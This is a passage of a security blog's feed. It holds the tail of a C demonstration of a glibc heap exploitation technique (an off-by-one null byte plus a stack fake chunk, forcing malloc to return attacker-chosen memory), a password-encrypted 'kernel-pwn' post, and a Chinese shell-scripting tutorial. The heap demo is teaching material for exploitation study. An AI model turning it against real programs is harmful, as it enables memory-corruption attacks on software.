create a fake chunk wherever we want, in this case we'll create the chunk on the stack\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"However, you can also create the chunk in the heap or the bss, as long as you know its address\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"(although we could do the unsafe unlink technique here in some scenarios)\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> fake_chunk[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line">fake_chunk[<span class="number">0</span>] = <span class="number">0x100</span>; <span class="comment">// prev_size is now used and must equal fake_chunk's size to pass P-&gt;bk-&gt;size == P-&gt;prev_size</span></span><br><span class="line">fake_chunk[<span class="number">1</span>] = <span class="number">0x100</span>; <span class="comment">// size of the chunk just needs to be small enough to stay in the small bin</span></span><br><span class="line">fake_chunk[<span class="number">2</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">// fwd</span></span><br><span class="line">fake_chunk[<span class="number">3</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">// bck</span></span><br><span class="line">fake_chunk[<span class="number">4</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">//fwd_nextsize</span></span><br><span class="line">fake_chunk[<span class="number">5</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">//bck_nextsize</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Our fake chunk at %p looks like:\n"</span>, fake_chunk);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"prev_size (not used): %#lx\n"</span>, fake_chunk[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"size: %#lx\n"</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"fwd: %#lx\n"</span>, fake_chunk[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"bck: %#lx\n"</span>, fake_chunk[<span class="number">3</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"fwd_nextsize: %#lx\n"</span>, fake_chunk[<span class="number">4</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"bck_nextsize: %#lx\n"</span>, fake_chunk[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment"> * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span></span><br><span class="line"><span class="comment"> * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line"><span class="keyword">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nWe allocate 0xf8 bytes for 'b'.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"b: %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"><span class="comment">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nb.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"b.size is: (0x100) | prev_inuse = 0x101\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We overflow 'a' with a single null byte into the metadata of 'b'\n"</span>);</span><br><span class="line">a[real_a_size] = <span class="number">0</span>; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"b.size: %#lx\n"</span>, *b_size_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This is easiest if b.size is a multiple of 0x100 so you "</span></span><br><span class="line">   <span class="string">"don't change the size of b, only its prev_inuse bit\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"If it had been modified, we would need a fake chunk inside "</span></span><br><span class="line">   <span class="string">"b where it will try to consolidate the next chunk\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write a fake prev_size to the end of a</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nWe write a fake prev_size to the last %lu bytes of a so that "</span></span><br><span class="line">   <span class="string">"it will consolidate with our fake chunk\n"</span>, <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line"><span class="keyword">size_t</span> fake_size = (<span class="keyword">size_t</span>)((b-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)*<span class="number">2</span>) - (<span class="keyword">uint8_t</span>*)fake_chunk);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Our fake prev_size will be %p - %p = %#lx\n"</span>, b-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)*<span class="number">2</span>, fake_chunk, fake_size);</span><br><span class="line">*(<span class="keyword">size_t</span>*)&amp;a[real_a_size-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Change the fake chunk's size to reflect b's new prev_size</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nModify fake chunk's size to reflect b's new prev_size\n"</span>);</span><br><span class="line">fake_chunk[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">// free b and it will consolidate with our fake chunk</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Our fake chunk size is now %#lx (b.size + fake_prev_size)\n"</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//if we allocate another chunk before we free b we will need to </span></span><br><span class="line"><span class="comment">//do two things: </span></span><br><span class="line"><span class="comment">//1) We will need to adjust the size of our fake chunk so that</span></span><br><span class="line"><span class="comment">//fake_chunk + fake_chunk's size points to an area we control</span></span><br><span class="line"><span class="comment">//2) we will need to write the size of our fake chunk</span></span><br><span class="line"><span class="comment">//at the location we control. </span></span><br><span class="line"><span class="comment">//After doing these two things, when unlink gets called, our fake chunk will</span></span><br><span class="line"><span class="comment">//pass the size(P) == prev_size(next_chunk(P)) test. </span></span><br><span class="line"><span class="comment">//otherwise we need to make sure that our fake chunk is up against the</span></span><br><span class="line"><span class="comment">//wilderness</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nNow we can call malloc() and it will begin in our fake chunk\n"</span>);</span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Next malloc(0x200) is at %p\n"</span>, d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>文章主要做了一个事，<strong>利用free的后向合并把top chunk设为我们伪造的chunk地址来强制malloc分配到我们伪造的地址</strong></p><p>流程：</p><ol><li>先分配两个chunk，a和b</li><li></li></ol></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;回档到堆&lt;/p&gt;</summary>
    
    
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>kernel-pwn</title>
    <link href="https://pz1o.top/2021/05/05/kernel-pwn/"/>
    <id>https://pz1o.top/2021/05/05/kernel-pwn/</id>
    <published>2021-05-05T11:06:54.000Z</published>
    <updated>2021-06-06T13:58:18.441Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div>]]></content>
    
    
    <summary type="html">The article has been encrypted, please enter your password to view.&lt;br&gt;</summary>
    
    
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>learn shell</title>
    <link href="https://pz1o.top/2021/05/03/learn-shell/"/>
    <id>https://pz1o.top/2021/05/03/learn-shell/</id>
    <published>2021-05-03T12:18:51.000Z</published>
    <updated>2021-06-09T11:45:57.784Z</updated>
    
    <content type="html"><![CDATA[<p>shell是个好东西</p><a id="more"></a><p>多学多用</p><h1 id="0x01-变量"><a href="#0x01-变量" class="headerlink" title="0x01 变量"></a>0x01 变量</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#变量命名</span></span><br><span class="line">your_name=pz1o</span><br><span class="line"><span class="comment">#使用变量</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;your_name&#125;</span></span><br><span class="line"><span class="comment">#只读变量</span></span><br><span class="line"><span class="built_in">readonly</span> your_name</span><br><span class="line"><span class="comment">#删除变量</span></span><br><span class="line"><span class="built_in">unset</span> your_name</span><br></pre></td></tr></table></figure><h2 id="1-变量类型"><a href="#1-变量类型" class="headerlink" title="1. 变量类型"></a>1. 变量类型</h2><ul><li><strong>1) 局部变量</strong> 局部变量在脚本或命令中定义，仅在当前shell实例中有效，其他shell启动的程序不能访问局部变量。</li><li><strong>2) 环境变量</strong> 所有的程序，包括shell启动的程序，都能访问环境变量，有些程序需要环境变量来保证其正常运行。必要的时候shell脚本也可以定义环境变量。</li><li><strong>3) shell变量</strong> shell变量是由shell程序设置的特殊变量。shell变量中有一部分是环境变量，有一部分是局部变量，这些变量保证了shell的正常运行</li></ul><h2 id="2-字符串"><a href="#2-字符串" class="headerlink" title="2. 字符串"></a>2. 字符串</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#字符串</span></span><br><span class="line">str=<span class="string">"pz1o"</span></span><br><span class="line">hello=<span class="string">"hello <span class="variable">$&#123;str&#125;</span>"</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="variable">$&#123;hello&#125;</span></span><br><span class="line"><span class="comment">#字符串长度</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#str&#125;</span></span><br><span class="line"><span class="comment">#提取字符串</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;str:1:4&#125;</span></span><br><span class="line"><span class="comment">#提取字符串</span></span><br><span class="line"><span class="built_in">echo</span> `expr index <span class="string">"<span class="variable">$&#123;hello&#125;</span>"</span> pz1o`</span><br></pre></td></tr></table></figure><h2 id="3-数组"><a href="#3-数组" class="headerlink" title="3. 数组"></a>3. 数组</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#数组</span></span><br><span class="line">name=(<span class="string">"pz1o"</span> <span class="string">"CUMT"</span> <span class="string">"PWN"</span>)</span><br><span class="line"><span class="comment">#读取数组</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;name[0]&#125;</span></span><br><span class="line"><span class="comment">#@可以读取所有数组</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;name[@]&#125;</span></span><br><span class="line"><span class="comment">#获取数组长度</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#name[@]&#125;</span></span><br><span class="line"><span class="comment">#多行注释</span></span><br><span class="line">:&lt;&lt;EOF</span><br><span class="line">...</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><h1 id="0x02-传递参数"><a href="#0x02-传递参数" class="headerlink" title="0x02 传递参数"></a>0x02 传递参数</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#author:pz1o</span></span><br><span class="line"><span class="comment">#$0是文件名</span></span><br><span class="line"><span class="comment">#$1 $2 依次为后面的参数</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"The file name is "</span><span class="variable">$0</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"The first argument is "</span><span class="variable">$1</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"The second argument is "</span><span class="variable">$2</span></span><br><span class="line"><span class="comment">#主要看一下$@和$*</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"-- \$* 演示 ---"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"$*"</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"-- \$@ 演示 ---"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"<span class="variable">$@</span>"</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>特别的变量</p><div class="table-container"><table><thead><tr><th>$#</th><th>传递到脚本的参数个数</th></tr></thead><tbody><tr><td>$*</td><td>以一个单字符串显示所有向脚本传递的参数。 如”$*”用「”」括起来的情况、以”$1 $2 … $n”的形式输出所有参数。</td></tr><tr><td>$$</td><td>脚本运行的当前进程ID号</td></tr><tr><td>$!</td><td>后台运行的最后一个进程的ID号</td></tr><tr><td>$@</td><td>与$*相同，但是使用时加引号，并在引号中返回每个参数。 如”​$@”用「”」括起来的情况、以”​$1” “$2” … “$n” 的形式输出所有参数。</td></tr><tr><td>$-</td><td>显示Shell使用的当前选项，与<a href="https://www.runoob.com/linux/linux-comm-set.html" target="_blank" rel="noopener">set命令</a>功能相同。</td></tr><tr><td>$?</td><td>显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误。</td></tr></tbody></table></div><p>$* 与 $@ 区别：</p><ul><li>相同点：都是引用所有参数。</li><li>不同点：只有在双引号中体现出来。假设在脚本运行时写了三个参数 1、2、3，，则 “ * “ 等价于 “1 2 3”（传递了一个参数），而 “@” 等价于 “1” “2” “3”（传递了三个参数）。</li></ul><h1 id="0x03-运算符"><a href="#0x03-运算符" class="headerlink" title="0x03 运算符"></a>0x03 运算符</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">exp=`expr 1 + 1`</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;exp&#125;</span></span><br><span class="line"><span class="comment">#这里直接复制了</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> = <span class="variable">$b</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">"<span class="variable">$a</span> = <span class="variable">$b</span> : a 等于 b"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">"<span class="variable">$a</span> = <span class="variable">$b</span>: a 不等于 b"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> != <span class="variable">$b</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">"<span class="variable">$a</span> != <span class="variable">$b</span> : a 不等于 b"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">"<span class="variable">$a</span> != <span class="variable">$b</span>: a 等于 b"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$a</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">"-z <span class="variable">$a</span> : 字符串长度为 0"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">"-z <span class="variable">$a</span> : 字符串长度不为 0"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">"<span class="variable">$a</span>"</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">"-n <span class="variable">$a</span> : 字符串长度不为 0"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">"-n <span class="variable">$a</span> : 字符串长度为 0"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">"<span class="variable">$a</span> : 字符串不为空"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">"<span class="variable">$a</span> : 字符串为空"</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>常见运算符就不说了</p><h2 id="1-关系运算符"><a href="#1-关系运算符" class="headerlink" title="1. 关系运算符"></a>1. 关系运算符</h2><div class="table-container"><table><thead><tr><th style="text-align:left">运算符</th><th style="text-align:left">说明</th><th style="text-align:left">举例</th></tr></thead><tbody><tr><td style="text-align:left">-eq</td><td style="text-align:left">检测两个数是否相等，相等返回 true。</td><td style="text-align:left">[ $a -eq $b ] 返回 false。</td></tr><tr><td style="text-align:left">-ne</td><td style="text-align:left">检测两个数是否不相等，不相等返回 true。</td><td style="text-align:left">[ $a -ne $b ] 返回 true。</td></tr><tr><td style="text-align:left">-gt</td><td style="text-align:left">检测左边的数是否大于右边的，如果是，则返回 true。</td><td style="text-align:left">[ $a -gt $b ] 返回 false。</td></tr><tr><td style="text-align:left">-lt</td><td style="text-align:left">检测左边的数是否小于右边的，如果是，则返回 true。</td><td style="text-align:left">[ $a -lt $b ] 返回 true。</td></tr><tr><td style="text-align:left">-ge</td><td style="text-align:left">检测左边的数是否大于等于右边的，如果是，则返回 true。</td><td style="text-align:left">[ $a -ge $b ] 返回 false。</td></tr><tr><td style="text-align:left">-le</td><td style="text-align:left">检测左边的数是否小于等于右边的，如果是，则返回 true。</td><td style="text-align:left">[ $a -le $b ] 返回 true。</td></tr></tbody></table></div><h2 id="2-布尔运算符"><a href="#2-布尔运算符" class="headerlink" title="2. 布尔运算符"></a>2. 布尔运算符</h2><div class="table-container"><table><thead><tr><th style="text-align:left">运算符</th><th style="text-align:left">说明</th><th style="text-align:left">举例</th></tr></thead><tbody><tr><td style="text-align:left">!</td><td style="text-align:left">非运算，表达式为 true 则返回 false，否则返回 true。</td><td style="text-align:left">[ ! false ] 返回 true。</td></tr><tr><td style="text-align:left">-o</td><td style="text-align:left">或运算，有一个表达式为 true 则返回 true。</td><td style="text-align:left">[$a -lt 20 -o $b -gt 100 ] 返回 true。</td></tr><tr><td style="text-align:left">-a</td><td style="text-align:left">与运算，两个表达式都为 true 才返回 true。</td><td style="text-align:left">[ $a -lt 20 -a $b -gt 100 ] 返回 false。</td></tr></tbody></table></div><h2 id="3-字符串运算符"><a href="#3-字符串运算符" class="headerlink" title="3. 字符串运算符"></a>3. 字符串运算符</h2><div class="table-container"><table><thead><tr><th style="text-align:left">运算符</th><th style="text-align:left">说明</th><th style="text-align:left">举例</th></tr></thead><tbody><tr><td style="text-align:left">=</td><td style="text-align:left">检测两个字符串是否相等，相等返回 true。</td><td style="text-align:left">[ $a = $b ] 返回 false。</td></tr><tr><td style="text-align:left">!=</td><td style="text-align:left">检测两个字符串是否不相等，不相等返回 true。</td><td style="text-align:left">[ $a != $b ] 返回 true。</td></tr><tr><td style="text-align:left">-z</td><td style="text-align:left">检测字符串长度是否为0，为0返回 true。</td><td style="text-align:left">[ -z $a ] 返回 false。</td></tr><tr><td style="text-align:left">-n</td><td style="text-align:left">检测字符串长度是否不为 0，不为 0 返回 true。</td><td style="text-align:left">[ -n “$a” ] 返回 true。</td></tr><tr><td style="text-align:left">$</td><td style="text-align:left">检测字符串是否为空，不为空返回 true。</td><td style="text-align:left">[ $a ] 返回 true。</td></tr></tbody></table></div><h2 id="4-文件测试运算符"><a href="#4-文件测试运算符" class="headerlink" title="4. 文件测试运算符"></a>4. 文件测试运算符</h2><p>感觉不太用得着</p><p>直接复制了</p><div class="table-container"><table><thead><tr><th style="text-align:left">操作符</th><th style="text-align:left">说明</th><th style="text-align:left">举例</th></tr></thead><tbody><tr><td style="text-align:left">-b file</td><td style="text-align:left">检测文件是否是块设备文件，如果是，则返回 true。</td><td style="text-align:left">[ -b $file ] 返回 false。</td></tr><tr><td style="text-align:left">-c file</td><td style="text-align:left">检测文件是否是字符设备文件，如果是，则返回 true。</td><td style="text-align:left">[ -c $file ] 返回 false。</td></tr><tr><td style="text-align:left">-d file</td><td style="text-align:left">检测文件是否是目录，如果是，则返回 true。</td><td style="text-align:left">[ -d $file ] 返回 false。</td></tr><tr><td style="text-align:left">-f file</td><td style="text-align:left">检测文件是否是普通文件（既不是目录，也不是设备文件），如果是，则返回 true。</td><td style="text-align:left">[ -f $file ] 返回 true。</td></tr><tr><td style="text-align:left">-g file</td><td style="text-align:left">检测文件是否设置了 SGID 位，如果是，则返回 true。</td><td style="text-align:left">[ -g $file ] 返回 false。</td></tr><tr><td style="text-align:left">-k file</td><td style="text-align:left">检测文件是否设置了粘着位(Sticky Bit)，如果是，则返回 true。</td><td style="text-align:left">[ -k $file ] 返回 false。</td></tr><tr><td style="text-align:left">-p file</td><td style="text-align:left">检测文件是否是有名管道，如果是，则返回 true。</td><td style="text-align:left">[ -p $file ] 返回 false。</td></tr><tr><td style="text-align:left">-u file</td><td style="text-align:left">检测文件是否设置了 SUID 位，如果是，则返回 true。</td><td style="text-align:left">[ -u $file ] 返回 false。</td></tr><tr><td style="text-align:left">-r file</td><td style="text-align:left">检测文件是否可读，如果是，则返回 true。</td><td style="text-align:left">[ -r $file ] 返回 true。</td></tr><tr><td style="text-align:left">-w file</td><td style="text-align:left">检测文件是否可写，如果是，则返回 true。</td><td style="text-align:left">[ -w $file ] 返回 true。</td></tr><tr><td style="text-align:left">-x file</td><td style="text-align:left">检测文件是否可执行，如果是，则返回 true。</td><td style="text-align:left">[ -x $file ] 返回 true。</td></tr><tr><td style="text-align:left">-s file</td><td style="text-align:left">检测文件是否为空（文件大小是否大于0），不为空返回 true。</td><td style="text-align:left">[ -s $file ] 返回 true。</td></tr><tr><td style="text-align:left">-e file</td><td 